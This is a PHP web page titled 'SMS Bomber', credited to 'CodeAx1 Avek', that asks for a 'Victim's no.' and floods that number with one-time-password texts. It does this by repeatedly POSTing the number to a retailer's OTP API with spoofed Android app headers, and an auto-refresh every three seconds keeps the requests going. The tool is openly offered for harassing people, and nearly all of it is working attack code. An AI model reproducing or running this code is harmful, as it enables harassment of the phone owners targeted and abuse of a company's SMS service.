<!DOCTYPE html><html><head><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Girassol&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Baloo+Thambi+2&family=Josefin+Sans:ital,wght@1,500&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Staatliches&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Arimo:ital@1&display=swap" rel="stylesheet"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
<style type="text/css">
*{padding:0px; margin:0px; }
</style><title>SMS  CodeAx</title></head><body class="bg-info"><nav class="navbar sticky-top navbar-light" style="background-color: #707070;><div class="container-fluid"><a class="navbar-brand" href="/"><span class="text-danger" style="font-family: 'Staatliches', cursive;">~SMS Bomber CodeAx1~</span></a></div></nav><br><br><br><?php
error_reporting(0); /*it will not let you show errors*/

if(isset($_GET['submit'])){
 header('refresh: 3'); // comment this code, if not to refresh the page.
$gv=$_GET['gg'];
function RandomNumber($length){
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);}return $str;}
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$no = rand(1,999);
function rando($length) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}


// Y O U R   W O R K S   S T A R T   F R O M   H E R E


$digit_2 = RandomNumber(2);

$digit_5 = RandomNumber(7);

$first_name = $fname;

$mobile = $_REQUEST['mobile'];


$url1="https://api.nnnow.com/m/mobapi/otp/generateOtp/v1/flash";

// $url2="
// example2.com
// ";

// $url3="
// example3.com
// ";


$data1='{"mobileNumber":"'.$mobile.'"}';

// $data2='
// {"email":"dummy email","fb_id":"dummy id","invite_code":"XXXXXXX","mobile_number":"9988776655","name":"dummy name","password":"dummy123"}
// ';

// $data3='
// {"email":"dummy email","fb_id":"dummy id","invite_code":"XXXXXXX","mobile_number":"9988776655","name":"dummy name","password":"dummy123"}
// ';


$headers1[]='POST/m/mobapi/otp/generateOtp/v1/flash HTTP/1.1';
$headers1[]='package: com.nnnow.arvind';
$headers1[]='isTablet: false';
$headers1[]='appversion: 2.2.0';
$headers1[]='platform: android';
$headers1[]='correlationId: 11cd4a6d-de5b-439d-abbb-947b33f9f386';
$headers1[]='module: android';
$headers1[]='Content-Type: application/json; charset=UTF-8';
$headers1[]='Host: api.nnnow.com';
$headers1[]='Connection: Keep-Alive';
$headers1[]='Accept-Encoding: gzip';
$headers1[]='User-Agent: okhttp/3.12.1';
// $headers2[]='';
// $headers2[]='';
// $headers2[]='';
// $headers2[]='';
// $headers2[]='';
// $headers2[]='';

// $headers3[]='';
// $headers3[]='';
// $headers3[]='';
// $headers3[]='';
// $headers3[]='';
// $headers3[]='';



$udata1=str_replace("\n", "", $data1); $headers1[]='Content-length: '.strlen($udata1).''; $uurl1= str_replace("\n", "", $url1); $uheaders1=str_replace("\n", "", $headers1); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl1);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders1);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$one=curl_exec($ch);json_encode($one);$json=json_decode($one,1);curl_close ($ch);curl_close ($ch);
$udata2=str_replace("\n", "", $data2); $headers2[]='Content-length: '.strlen($udata2).''; $uurl2= str_replace("\n", "", $url2); $uheaders2=str_replace("\n", "", $headers2); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl2);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders2);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata2);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$two=curl_exec($ch);json_encode($two);$json=json_decode($two,1);curl_close ($ch);curl_close ($ch);
$udata3=str_replace("\n", "", $data3); $headers3[]='Content-length: '.strlen($udata3).''; $uurl3= str_replace("\n", "", $url3); $uheaders3=str_replace("\n", "", $headers3); $ch=curl_init();curl_setopt($ch, CURLOPT_URL,$uurl3);curl_setopt($ch, CURLOPT_HEADER,0);curl_setopt($ch, CURLOPT_HTTPHEADER,$uheaders3);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,$udata3);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);$three=curl_exec($ch);json_encode($three);$json=json_decode($three,1);curl_close ($ch);curl_close ($ch);
if(strlen($mobile)==10){
$message = "SMS Bombing started on $mobile";
}else{$message = "Please Enter valid number";}

echo "<div class='container text-center my-4'><div style='background-color: #fff;'><br>
<h4 class='pb-2 text-info'>Message</h4><p class='text-danger font-weight-bold'> $message </p><br></div></div><br><br></div>";}if(!isset($_GET['submit'])){echo"
<div class='mx-3 bg-info'><br><div class= 'container my-3' style='background-color: #fff;'><br><br><form class='py-3 text-center' method='get' action=''><div class='input-group my-4'>
<div class='input-group my-4'><span class='input-group-text text-white bg-danger' id='inputGroup-sizing-default'>Victim's no.</span>
<input type='number' class='form-control' placeholder='mobile no' name = 'mobile' aria-label='Sizing example input' aria-describedby='inputGroup-sizing-default' required>
</div><input class='sbm btn font-weight-bold btn-info col-6 my-3 text-center' name='submit' type='submit' value='Bomb'></div>";
}?>
<br><hr>
<h1>Devloped by CodeAx1 Avek</h1>
<a href="https://www.youtube.com/c/CodeAx10"><button type="button" class="btn btn-outline-dark" target='*_blank'>Subscribe Youtube Channel</button></a>
